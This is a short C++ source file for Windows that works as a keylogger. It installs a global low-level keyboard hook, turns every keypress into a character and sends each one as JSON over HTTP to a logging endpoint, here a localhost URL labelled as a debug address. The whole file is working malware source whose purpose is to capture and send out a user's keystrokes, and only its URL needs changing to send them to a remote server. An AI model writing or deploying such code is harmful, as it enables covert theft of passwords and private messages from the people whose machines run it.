#include <iostream>
#include <Windows.h>
#include <cpr/cpr.h>

const char* DEBUG_URL = "http://127.0.0.1:8000/log";

LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
    auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

    if (wParam ==WM_KEYDOWN) {
        char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
        printf("%c\n", c);

        std::string body = "";
        body += c;

        const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
        cpr::Body{"{\"text\": \"" + body + "\"}"});

        printf("%s\n", r.text.c_str());
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC(&KeyboardCallback), nullptr, 0);

    MSG message;
    while (GetMessage(&message, NULL, NULL, NULL) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(keyboard);

    return 0;
}
